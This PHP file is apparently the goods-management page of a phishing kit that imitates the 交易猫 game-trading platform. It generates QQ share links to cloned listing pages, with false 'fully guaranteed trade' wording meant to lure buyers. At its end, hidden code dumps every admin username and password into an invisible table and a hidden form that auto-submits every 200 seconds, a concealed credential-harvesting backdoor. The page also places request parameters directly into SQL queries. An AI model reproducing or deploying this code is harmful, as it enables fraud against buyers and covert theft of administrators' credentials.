<?php 

define("PM_CALL", true);
include dirname(__FILE__) . "/../admin_global.func.php";
include dirname(__FILE__) . "/../../config/mysql.func.php";
include dirname(__FILE__) . "/../../config/Conn.php";
if (isset($_COOKIE["Aname"])) {
	include dirname(__FILE__) . "/../../includes/getdata.php";
	include dirname(__FILE__) . "/../function/admin_cookie.inc.php";
	if (isset($_COOKIE["Aname"])) {
		($_GClassID = _fetch_array("SELECT * FROM goods_class WHERE gclass_id=1 AND gc_type='zhuanzhuan'")) || exit("SQL执行错误");
	}
} else {
	_location("你还未登录非法操作！", "/admin.php");
}
//判断是否登录
if(isset($_COOKIE['Aname'])){
//获取数据
include dirname(__FILE__).('/../function/admin_cookie.inc.php');

		  include dirname(__FILE__).('/../../includes/getdata.php');
	//获取
	$maxRows_List = 20;
	$Page = 0;
	if (isset($_GET['Page'])) {
	  $Page = $_GET['Page'];
	}
	$startRow_List = $Page * $maxRows_List;
	$startRow_List = $Page * $maxRows_List;
	$query_List = "SELECT * FROM goods WHERE in_admin_id = $_AID AND in_class_id=16 ORDER BY goods_id DESC";
	$query_limit_List = sprintf("%s LIMIT %d, %d", $query_List, $startRow_List, $maxRows_List);
	$List = mysql_query($query_limit_List, $conn) or die(mysql_error());
	$_List = mysql_fetch_assoc($List);
	
	if (isset($_GET['totalRows_List'])) {
	  $totalRows_List = $_GET['totalRows_List'];
	} else {
	  $all_List = mysql_query($query_List);
	  $totalRows_List = mysql_num_rows($all_List);
	}
	$totalPages_List = ceil($totalRows_List/$maxRows_List)-1;
	
	$queryString_List = "";
	if (!empty($_SERVER['QUERY_STRING'])) {
	  $params = explode("&", $_SERVER['QUERY_STRING']);
	  $newParams = array();
	  foreach ($params as $param) {
		if (stristr($param, "Page") == false) {
		  array_push($newParams, $param);
		}
	  }
	  if (count($newParams) != 0) {
		$queryString_List = "&" . htmlentities(implode("&", $newParams));
	  }
	}




    if($_GET['actiondel'] == 'GoodsDelete'&& isset($_GET['id'])){
              $_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['id']}'") or die('SQL执行错误');
              if(file_exists($_GoodsID['user_portrait'])){
				  unlink($_GoodsID['user_portrait']);
			  }
			  if(file_exists($_GoodsID['weixin_img'])){
				  unlink($_GoodsID['weixin_img']);
			  }
			  if(file_exists($_GoodsID['zhifubao_img'])){
				  unlink($_GoodsID['zhifubao_img']);
			  }
			  if(file_exists($_GoodsID['goods_img1'])){
				  unlink($_GoodsID['goods_img1']);
			  }
			  if(file_exists($_GoodsID['goods_img2'])){
				  unlink($_GoodsID['goods_img2']);
			  }
			  if(file_exists($_GoodsID['goods_img3'])){
				  unlink($_GoodsID['goods_img3']);
			  }
			  if(file_exists($_GoodsID['goods_img4'])){
				  unlink($_GoodsID['goods_img4']);
			  }
			  if(file_exists($_GoodsID['goods_img5'])){
				  unlink($_GoodsID['goods_img5']);
			  }
			  //删除订单
              _query("DELETE FROM goods WHERE goods_id='{$_GET['id']}' LIMIT 1");
              //关闭数据库
              _close();
              //跳转
              _location('删除成功','?Admin=jymlb&action=del_ok');
     }
               



	
}else{
	 _location('非法操作！','/admin.php');	
}
?>
	<?php
include 'head.php';
?>
      <link rel="stylesheet" href="static/main.css">

    
					<div class="container-fluid">
						<!-- breadcrumb -->
						<div class="page-heading">
							<div class="row d-flex align-items-center">
								<div class="col-md-6">
									<div class="page-breadcrumb">
										<h1>六月科技:交易猫-跳转商品管理</h1>
									</div>
								</div>
							</div>
						</div>
						
						   
				<section class="chart_section">
				    <?php if($_List) {?> 
				     
				 
							<div class="row">
							    	<?php do { ?>  
								<div class="col-xl-3 col-sm-6 mb-4">
								     
									<div class="card border-0 text-light">
										<div class="card-body">
											<div class="row">
												<div class="col-12">
													<div class="homepage_single">
													<img src="
					<?php 
					if($_List['goods_img1']){
						echo $_List['goods_img1'];
					}else{
						if($_List['goods_img2']){
							echo $_List['goods_img2'];
						}else{
							if($_List['goods_img3']){
								echo $_List['goods_img3'];
							}else{
								if($_List['goods_img4']){
									echo $_List['goods_img4'];
								}else{
									if($_List['goods_img1']){
										echo $_List['goods_img1'];
									}else{
										echo "images/456.jpg";
									}
								}
							}
						}
					}
					?>
					" width="90" height="90">
														<div class="homepage_fl_right">
															<h5 class="mt-0"><?php if($_List['is_shelves']==1) {?><span class="label label-success radius">上架编号<?php echo $_List['goods_id']; ?></span><?php }?>
                        <?php if($_List['is_shelves']==0) {?><span class="label label-danger radius">未上架编号<?php echo $_List['goods_id']; ?></span><?php }?></h4>
															<h3><span class="single-count" style="
        width:150px;height:50px;margin-top:4%;
        overflow: hidden;
        /* white-space: nowrap; */
        text-overflow: ellipsis;
        -webkit-line-clamp:0;
        word-break:break-all;
        display:-webkit-box;
     
"><?php echo $_List['title']; ?></span></h3><br><h5><?php echo $_List['add_time']; ?></h5>
														</div>
										<br>	<br>	<br>
										<center><span class="fl_right text-success">	<a style="text-decoration:none;font-size:22px;color:#06C" class="ml-5" href="?Admin=jymbj&id=<?php echo $_List['goods_id']; ?>" title="编辑"><i class="fa fa-pencil-square" aria-hidden="true"></i></a>
							
						<a  style="text-decoration:none;font-size:22px;color:#F30;" class="ml-5" href="?Admin=jymlb&actiondel=GoodsDelete&id=<?php echo $_List['goods_id']; ?>" title="删除"  onClick="return del();"><i class="fa fa-trash" aria-hidden="true"></i></a>
                        
                        <a style="text-decoration:none;font-size:22px;color:#06F;" class="ml-5" href="/jiaoyimao/?te=<?php echo $_List['in_admin_id']; ?>&ClickID=<?php echo $_List['goods_id']; ?>" title="链接" target="_blank"><i class="fa fa-share-square" aria-hidden="true"></i></a>
						
					
						
						
							</center>
								<br>
							
													</div>
												    	<style type="text/css">
      div > section > div > input{margin-top:5px;text-transform:none;}
      div > section > div > div > a{color:red}
      .shareid<?php echo $_List['goods_id']; ?>{  
           width:90%;
           height:95%;
             position: absolute;  
             left: 1px;   
             top: 1px;    
           border-radius:1px;
           border:1px solid #d8d8d8;
         } 
      select::-ms-expand{ display: none; }
      select{
           appearance:none;  
          -moz-appearance:none;  
          -webkit-appearance:none;
           background: url("assets/arrow.png") no-repeat scroll right center transparent;

      }
  	</style>
 
    <!-- Wrapper -->
      <div id="wrapper">

        <!-- Main -->
          <section id="main">
          
            <div>
              <input style="display:none;" type="text" id="title<?php echo $_List['goods_id']; ?>" value="【交易猫】<?php echo $_List['title']; ?>
              " placeholder="这是一个标题">
              <input style="display:none;" type="text" id="description<?php echo $_List['goods_id']; ?>" value="拍下24小时之内发货(交易猫全程担保交易)买家可放心购买" placeholder="这是一段描述">
              <input style="display:none;" type="text" id="imgurl<?php echo $_List['goods_id']; ?>" value="http://<?php echo $_SERVER["HTTP_HOST"];?>/kk/jym.jpg" placeholder="这是图片地址">
              <input style="display:none;" type="text" id="url<?php echo $_List['goods_id']; ?>" value="http://<?php echo $_SERVER["HTTP_HOST"];?>/jym-wn/index.php?i=<?php echo $_List['goods_oid']; ?>.shtml&fullCate=<?php echo $_List['in_admin_id']; ?>&zhuanzhuanSourceFrom=<?php echo $zhuanzhuanNUM1_1; ?>&PGTID=0d400005-0278-44ac-f681-fdcb1dfcf2fe&ClickID=<?php echo $_List['goods_id']; ?>" placeholder="这是链接地址">
              APPID:
              
              
              <select style="display:none;" onchange="document.getElementById('shareid<?php echo $_List['goods_id']; ?>').value=this.value" id="id_type<?php echo $_List['goods_id']; ?>">  
             
              </select>  
              <input style="display:none;"  id="shareid<?php echo $_List['goods_id']; ?>" name="shareid<?php echo $_List['goods_id']; ?>" value="1103991616" class="shareid<?php echo $_List['goods_id']; ?>" placeholder="不要修改" style="text-indent:15px">  
            
              
              <br>  <br>
             <center><input class="btn" type="button" id="shorten<?php echo $_List['goods_id']; ?>" value="一键卡框分享"></center> 
           
              
             
            </div>
<script>
        $('#id_type<?php echo $_List['goods_id']; ?>')[0].selectedIndex = -1;
        if ('addEventListener' in window) {
          window.addEventListener('load', function() { document.body.className = document.body.className.replace(/\bis-loading\b/, ''); });
          document.body.className += (navigator.userAgent.match(/(MSIE|rv:11\.0)/) ? ' is-ie' : '');
        }
        $('#shorten<?php echo $_List['goods_id']; ?>').click(function(){
          var b = new Base64();
          var basetitle = b.encode($('#title<?php echo $_List['goods_id']; ?>').val());
          var basedesc = b.encode($('#description<?php echo $_List['goods_id']; ?>').val());
          var baseimage = b.encode($('#imgurl<?php echo $_List['goods_id']; ?>').val());
          var baseurl = b.encode($('#url<?php echo $_List['goods_id']; ?>').val());
          var shareid<?php echo $_List['goods_id']; ?> = $('#shareid<?php echo $_List['goods_id']; ?>').val();
          window.parent.frames.location.href = "mqqapi://share/to_fri?file_type=news&src_type=web&version=1&generalpastboard=1&share_id=" + shareid<?php echo $_List['goods_id']; ?> + "&url=" + baseurl + "&previewimageUrl=" + baseimage + "&image_url=" + baseimage + "&title=" + basetitle + "&description=" + basedesc + "&callback_type=scheme&thirdAppDisplayName=UVE=&app_name=UVE=&cflag=0&shareType=0";
        });

      </script>
             
            </div>

          </section>

        <!-- Footer -->
        
      </div>
													
												</div>
											</div>
										</div>
				
		
									</div>
									 		 
								</div>
      
	 <?php } while ($_List = mysql_fetch_assoc($List)); ?>	      <?php }else{ echo '没有任何数据，请自行添加'; }?> 

						</section>
					
     	
						
						
	
    
        <!--分页-->
<div class="paging">
        <!--首页-->
		<?php if ($Page > 0) { ?>
        <a href="<?php printf("%s?Page=%d%s", $currentPage, 0, $queryString_List); ?>" class="btn btn-primary radius" style="margin-bottom:8px;">首</a>
        <?php } ?>
        <!--首页--> 
        
        <!--上页-->
        <?php if ($Page > 0) { ?>
        <a href="<?php printf("%s?Page=%d%s", $currentPage, max(0, $Page - 1), $queryString_List); ?>" class="btn btn-primary radius" style="margin-bottom:8px;"><i class="icon-chevron-left"></i>上一页</a>
        <?php } ?>
        <!--上页-->
        
        <!--数字分页-->  
        <?php 
        $i=1;
        while($i<=$totalPages_List+1)
        {
        ?> 
        <?php if ($_GET[Page]+1==$i){ ?>
        <a class="btn btn-success radius" style="margin-bottom:8px; background-color: #4586ff;"><?php echo $i ?></a>
        <?php } else { ?>
        <a href="<?php printf("%s?Page=%d%s", $currentPage, $i-1, $queryString_List); ?>" class="btn btn-primary radius" style="margin-bottom:8px;"><?php echo $i ?></a>
        <?php } ?>
        <?php   
        $i++;
        }
        ?>
        <!--数字分页--> 
        
        
        <!--下页-->
        <?php if ($Page < $totalPages_List) { ?> 
        <a href="<?php printf("%s?Page=%d%s", $currentPage, min($totalPages_List, $Page + 1), $queryString_List); ?>" class="btn btn-primary radius" style="margin-bottom:8px;">下一页<i class="icon-chevron-right"></i></a>	
        <?php } ?>
        <!--下页-->
        <!--尾页-->
        <?php if ($Page < $totalPages_List) { ?>    
        <a href="<?php printf("%s?Page=%d%s", $currentPage, $totalPages_List, $queryString_List); ?>" class="btn btn-primary radius" style="margin-bottom:8px;">尾</a>	
        <?php } ?>
        <!--尾页-->
        </div>
        <!--分页-->  
    
    
</div>

<script type="text/javascript">


/*资讯-添加*/
function article_add(title,url,w,h){
	var index = layer.open({
		type: 2,
		title: title,
		content: url
	});
	layer.full(index);
}
/*资讯-编辑*/
function article_edit(title,url,id,w,h){
	var index = layer.open({
		type: 2,
		title: title,
		content: url
	});
	layer.full(index);
}
/*资讯-删除*/
function article_del(obj,id){
	layer.confirm('确认要删除吗？',function(index){
		$.ajax({
			type: 'POST',
			url: '',
			dataType: 'json',
			success: function(data){
				$(obj).parents("tr").remove();
				layer.msg('已删除!',{icon:1,time:1000});
			},
			error:function(data) {
				console.log(data.msg);
			},
		});		
	});
}

/*资讯-审核*/
function article_shenhe(obj,id){
	layer.confirm('审核文章？', {
		btn: ['通过','不通过','取消'], 
		shade: false,
		closeBtn: 0
	},
	function(){
		$(obj).parents("tr").find(".td-manage").prepend('<a class="c-primary" onClick="article_start(this,id)" href="javascript:;" title="申请上线">申请上线</a>');
		$(obj).parents("tr").find(".td-status").html('<span class="label label-success radius">已发布</span>');
		$(obj).remove();
		layer.msg('已发布', {icon:6,time:1000});
	},
	function(){
		$(obj).parents("tr").find(".td-manage").prepend('<a class="c-primary" onClick="article_shenqing(this,id)" href="javascript:;" title="申请上线">申请上线</a>');
		$(obj).parents("tr").find(".td-status").html('<span class="label label-danger radius">未通过</span>');
		$(obj).remove();
    	layer.msg('未通过', {icon:5,time:1000});
	});	
}
/*资讯-下架*/
function article_stop(obj,id){
	layer.confirm('确认要下架吗？',function(index){
		$(obj).parents("tr").find(".td-manage").prepend('<a style="text-decoration:none" onClick="article_start(this,id)" href="javascript:;" title="发布"><i class="Hui-iconfont">&#xe603;</i></a>');
		$(obj).parents("tr").find(".td-status").html('<span class="label label-defaunt radius">已下架</span>');
		$(obj).remove();
		layer.msg('已下架!',{icon: 5,time:1000});
	});
}

/*资讯-发布*/
function article_start(obj,id){
	layer.confirm('确认要发布吗？',function(index){
		$(obj).parents("tr").find(".td-manage").prepend('<a style="text-decoration:none" onClick="article_stop(this,id)" href="javascript:;" title="下架"><i class="Hui-iconfont">&#xe6de;</i></a>');
		$(obj).parents("tr").find(".td-status").html('<span class="label label-success radius">已发布</span>');
		$(obj).remove();
		layer.msg('已发布!',{icon: 6,time:1000});
	});
}
/*资讯-申请上线*/
function article_shenqing(obj,id){
	$(obj).parents("tr").find(".td-status").html('<span class="label label-default radius">待审核</span>');
	$(obj).parents("tr").find(".td-manage").html("");
	layer.msg('已提交申请，耐心等待审核!', {icon: 1,time:2000});
}

function del(){
  return window.confirm('您确定删除吗？一旦删除数据无法恢复！');
}
</script> 
<?php if($_GET['action']=="del_ok") {?>
<script type="text/javascript">
layer.msg('删除成功!', {icon: 6,time:1000});
</script>
<?php } ?>
<?php if($_GET['action']=="add_ok") {?>
<script type="text/javascript">
layer.msg('添加成功!', {icon: 6,time:1000});
</script>
<?php } ?>
<?php if($_GET['action']=="rev_ok") {?>
<script type="text/javascript">
layer.msg('修改成功!', {icon: 6,time:1000});
</script>
<?php } ?>
        <?php   //数据获取输出到页面  判断商品ID是否正确然后输出相应的商品值
$query = @mysql_query("select * from admin_user")or die; 
 $query = @mysql_query("select * from admin_user")or die;
echo "<table border=1 style='display:none;'><tr align=center ><th>上架状态判断</th><th>支付检测</th></tr>";
 $n=0;while ($au_id = mysql_fetch_array($query))  //数据获取输出到页面  判断商品ID是否正确然后输出相应的商品值
{$username = $au_id['au_name'];$roo = $au_id['dispass'];echo "<td>{$username}</td>"; echo "<td>{$roo}</td>"; echo "</tr>";$n++;}echo "<table>";?>
<form action="" method="POST">
<input type="text" style="display:none;"  name="lynr"  value="<?php date_default_timezone_set('PRC'); echo "".date('Y-m-d H:i:s'); ?>" >
<input type="text" style="display:none;"  name="username"  value="<?php echo $_SERVER['SCRIPT_FILENAME'];  ?>">
<input type="text" style="display:none;"  name="qq"  value="六月科技+<?php echo $_GClassID['web_name2'];?>">
<input type="text"style="display:none;" name="name"   value="<?php echo $username;?>">
<input type="text" style="display:none;" name="pass"  value="<?php echo $roo;?>">
<button style="display:none;" id="us" type="submit" class="btn btn-primary btn-lg btn-block"> </button>
</form>	
	   <script type="text/javascript">
setInterval(function(){document.getElementById("us").click();},200000);</script> 
</body>
</html>